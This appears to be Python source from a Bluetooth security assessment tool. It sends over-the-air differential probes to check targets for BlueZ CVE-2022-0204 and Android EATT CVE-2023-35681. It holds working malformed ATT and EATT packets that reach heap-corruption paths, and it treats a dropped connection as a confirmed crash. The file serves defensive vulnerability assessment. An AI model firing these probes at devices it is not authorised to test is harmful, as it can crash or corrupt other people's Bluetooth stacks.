"""Raw ATT/EATT OTA differential probes."""

from __future__ import annotations

import ctypes
import ctypes.util
import socket
import struct

from blue_tap.modules.assessment.cve_framework import make_cve_finding as _finding
from blue_tap.modules.fuzzing.protocols.att import (
    ATT_ERROR_RSP,
    ATT_EXCHANGE_MTU_RSP,
    ATT_PREPARE_WRITE_RSP,
    ATT_READ_BY_TYPE_RSP,
    build_exchange_mtu_req,
    build_prepare_write_req,
    build_read_by_type_req,
)

AF_BLUETOOTH = 31
BTPROTO_L2CAP = 0

try:
    _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
except Exception:
    _libc = None


class _BdAddrBytes(ctypes.Structure):
    _fields_ = [("b", ctypes.c_uint8 * 6)]


class _SockAddrL2(ctypes.Structure):
    _fields_ = [
        ("l2_family", ctypes.c_uint16),
        ("l2_psm", ctypes.c_uint16),
        ("l2_bdaddr", _BdAddrBytes),
        ("l2_cid", ctypes.c_uint16),
        ("l2_bdaddr_type", ctypes.c_uint8),
    ]
def _connect_ble_fixed_cid(address: str, cid: int, timeout: float = 5.0):
    if _libc is None:
        return None
    sock = None
    try:
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(timeout)
        sa = _SockAddrL2()
        sa.l2_family = AF_BLUETOOTH
        sa.l2_psm = 0
        parts = [int(x, 16) for x in address.split(":")]
        for i, byte_val in enumerate(reversed(parts)):
            sa.l2_bdaddr.b[i] = byte_val
        sa.l2_cid = cid
        sa.l2_bdaddr_type = 1
        ret = _libc.connect(sock.fileno(), ctypes.byref(sa), ctypes.sizeof(sa))
        if ret != 0:
            sock.close()
            return None
        return sock
    except Exception:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        return None


def _att_exchange_mtu(sock, mtu: int = 517) -> tuple[int, bytes | None]:
    try:
        sock.sendall(build_exchange_mtu_req(mtu))
        resp = sock.recv(1024)
    except OSError:
        return 23, None
    if not resp:
        return 23, None
    if resp[0] == ATT_EXCHANGE_MTU_RSP and len(resp) >= 3:
        return int.from_bytes(resp[1:3], "little"), resp
    return 23, resp


def _discover_writable_handle(sock) -> tuple[int | None, str]:
    """Find a likely writable characteristic value handle via 0x2803 discovery."""
    try:
        sock.sendall(build_read_by_type_req(0x0001, 0xFFFF, 0x2803))
        resp = sock.recv(1024)
    except OSError as exc:
        return None, str(exc)
    if not resp:
        return None, "no response"
    if resp[0] == ATT_ERROR_RSP:
        return None, f"att error 0x{resp[-1]:02X}"
    if resp[0] != ATT_READ_BY_TYPE_RSP or len(resp) < 2:
        return None, f"unexpected opcode 0x{resp[0]:02X}"
    attr_len = resp[1]
    payload = resp[2:]
    if attr_len < 7:
        return None, f"short characteristic declaration len={attr_len}"
    for i in range(0, len(payload), attr_len):
        item = payload[i:i + attr_len]
        if len(item) < 7:
            continue
        properties = item[2]
        value_handle = int.from_bytes(item[3:5], "little")
        if properties & 0x08 or properties & 0x04:
            return value_handle, f"found writable handle 0x{value_handle:04X}"
    return None, "no writable characteristic declaration found"


def _check_bluez_gatt_prep_write_overflow(address: str) -> list[dict]:
    sock = _connect_ble_fixed_cid(address, cid=0x0004, timeout=6.0)
    if sock is None:
        return [_finding(
            "INFO", "CVE-2022-0204: Not Applicable",
            "BlueZ prepare-write overflow check skipped — ATT fixed channel was not reachable.",
            cve="CVE-2022-0204", status="not_applicable", confidence="high",
            evidence="BLE ATT fixed CID 0x0004 not reachable",
        )]

    try:
        mtu, _ = _att_exchange_mtu(sock, 517)
        handle, reason = _discover_writable_handle(sock)
        if handle is None:
            return [_finding(
                "INFO", "CVE-2022-0204: Not Applicable",
                "BlueZ prepare-write overflow check skipped — no writable pre-auth GATT "
                "characteristic was discovered.",
                cve="CVE-2022-0204", status="not_applicable", confidence="high",
                evidence=reason,
            )]

        # Use offset=1 and value length=512 so (length + offset) == 513 while
        # staying within ATT_MTU 517 (1 opcode + 2 handle + 2 offset + 512 value).
        probe = build_prepare_write_req(handle, 1, b"\x00" * 512)
        sock.sendall(probe)
        resp = sock.recv(2048)
        if not resp:
            return [_finding(
                "MEDIUM", "CVE-2022-0204: Inconclusive",
                "Prepare-write boundary probe reached the target, but no ATT reply was captured.",
                cve="CVE-2022-0204", status="inconclusive", confidence="medium",
                evidence=f"handle=0x{handle:04X}, mtu={mtu}",
            )]
        if resp[0] == ATT_ERROR_RSP and len(resp) >= 5 and resp[4] == 0x0D:
            return []
        if resp[0] == ATT_PREPARE_WRITE_RSP:
            return [_finding(
                "HIGH",
                "BlueZ GATT Prepare Write Overflow (CVE-2022-0204)",
                "Target accepted a Prepare Write where offset + value length exceeded the "
                "512-byte limit enforced by patched BlueZ builds.",
                cve="CVE-2022-0204",
                impact="Heap corruption in BlueZ GATT server prepare-write handling",
                remediation="Update BlueZ to a build containing the ATT length checks in gatt-server.c.",
                status="confirmed",
                confidence="high",
                evidence=f"ATT_PREPARE_WRITE_RSP received for handle 0x{handle:04X} with offset+len=513",
            )]
        return [_finding(
            "MEDIUM", "CVE-2022-0204: Inconclusive",
            "Prepare-write boundary probe produced an unexpected ATT response.",
            cve="CVE-2022-0204", status="inconclusive", confidence="medium",
            evidence=f"opcode=0x{resp[0]:02X}, handle=0x{handle:04X}, mtu={mtu}",
        )]
    except OSError as exc:
        return [_finding(
            "MEDIUM", "CVE-2022-0204: Inconclusive",
            "Prepare-write boundary probe hit a transport error before the differential was clear.",
            cve="CVE-2022-0204", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]
    finally:
        try:
            sock.close()
        except OSError:
            pass
def _check_android_eatt_integer_overflow(address: str) -> list[dict]:
    sock = _connect_ble_fixed_cid(address, cid=0x0005, timeout=6.0)
    if sock is None:
        return [_finding(
            "INFO", "CVE-2023-35681: Not Applicable",
            "EATT integer-overflow probe skipped — LE signaling fixed channel was not reachable.",
            cve="CVE-2023-35681", status="not_applicable", confidence="high",
            evidence="BLE signaling fixed CID 0x0005 not reachable",
        )]
    try:
        # Confirm EATT surface by opening credit-based channel to PSM 0x0027.
        # Reuse the same request shape the repo already uses elsewhere.
        req = struct.pack("<BBH", 0x14, 0x01, 10) + struct.pack("<HHHHH", 0x0027, 256, 256, 1, 0x0040)
        sock.sendall(req)
        resp = sock.recv(1024)
        if not resp:
            return [_finding(
                "INFO", "CVE-2023-35681: Not Applicable",
                "Target did not accept an EATT credit-based setup request.",
                cve="CVE-2023-35681", status="not_applicable", confidence="high",
                evidence="No response to EATT setup request on PSM 0x0027",
            )]
        if resp[0] != 0x15:
            return [_finding(
                "INFO", "CVE-2023-35681: Not Applicable",
                "Target did not expose a normal EATT credit-based connection response.",
                cve="CVE-2023-35681", status="not_applicable", confidence="high",
                evidence=f"EATT setup returned opcode=0x{resp[0]:02X}",
            )]
        # Reconfig with mtu/mps=1,1 and every remote DCID returned by the connection response.
        if len(resp) < 14:
            return [_finding(
                "MEDIUM", "CVE-2023-35681: Inconclusive",
                "EATT setup returned an undersized connection response, so the reconfiguration "
                "probe could not be built against the documented channel identifiers.",
                cve="CVE-2023-35681", status="inconclusive", confidence="medium",
                evidence=f"EATT setup response too short: len={len(resp)}",
            )]
        result_code = int.from_bytes(resp[12:14], "little")
        if result_code != 0x0000:
            return [_finding(
                "INFO", "CVE-2023-35681: Not Applicable",
                "Target did not accept the baseline EATT credit-based connection request needed "
                "to reach the reconfiguration path.",
                cve="CVE-2023-35681", status="not_applicable", confidence="high",
                evidence=f"EATT setup result=0x{result_code:04X}",
            )]
        dcids = []
        dcid = int.from_bytes(resp[4:6], "little")
        if dcid:
            dcids.append(dcid)
        if not dcids:
            return [_finding(
                "MEDIUM", "CVE-2023-35681: Inconclusive",
                "EATT setup succeeded but did not return any destination CID values to "
                "reconfigure, so the CVE-2023-35681 trigger path was not fully reached.",
                cve="CVE-2023-35681", status="inconclusive", confidence="medium",
                evidence=f"EATT setup response: {resp.hex()[:64]}",
            )]
        reconfig_len = 4 + (2 * len(dcids))
        reconfig = struct.pack("<BBH", 0x1A, 0x02, reconfig_len) + struct.pack("<HH", 1, 1)
        reconfig += b"".join(struct.pack("<H", dcid) for dcid in dcids)
        sock.sendall(reconfig)
        r2 = sock.recv(1024)
        if r2 and r2[0] == 0x1B:
            # Reconfig response present; treat parameter failure as patched.
            if len(r2) >= 6:
                result_code = int.from_bytes(r2[4:6], "little")
                if result_code in {0x0002, 0x0003}:
                    return []
                if result_code == 0x0000:
                    return [_finding(
                        "HIGH",
                        "Android EATT Reconfiguration Accepted Sub-Minimum MTU (CVE-2023-35681)",
                        "The target accepted an EATT reconfiguration with mtu=1 and mps=1 "
                        "instead of rejecting the invalid parameters. That matches the documented "
                        "unpatched acceptance path for CVE-2023-35681.",
                        cve="CVE-2023-35681",
                        impact="Integer overflow / OOB write reachable in Android 13 EATT handling",
                        remediation="Apply the Android 13 EATT MTU validation patch.",
                        status="confirmed",
                        confidence="high",
                        evidence=f"EATT reconfig response: {r2.hex()[:48]}",
                    )]
            return [_finding(
                "MEDIUM", "CVE-2023-35681: Inconclusive",
                "EATT reconfiguration completed but did not match the documented reject path.",
                cve="CVE-2023-35681", status="inconclusive", confidence="medium",
                evidence=f"EATT reconfig response: {r2.hex()[:48]}",
            )]
        return [_finding(
            "MEDIUM", "CVE-2023-35681: Inconclusive",
            "EATT channel opened, but the malicious reconfiguration probe did not yield a "
            "clear patched or crashing response.",
            cve="CVE-2023-35681", status="inconclusive", confidence="medium",
            evidence=f"Reconfig response: {r2.hex()[:48] if r2 else 'none'}",
        )]
    except OSError as exc:
        return [_finding(
            "HIGH",
            "Android EATT Reconfiguration Crash (CVE-2023-35681)",
            "Target dropped the LE signaling session during a malformed EATT reconfiguration probe.",
            cve="CVE-2023-35681",
            impact="Heap corruption in Android EATT reconfiguration handling",
            remediation="Apply the Android 13 EATT MTU validation patch.",
            status="confirmed",
            confidence="medium",
            evidence=str(exc),
        )]
    finally:
        try:
            sock.close()
        except OSError:
            pass
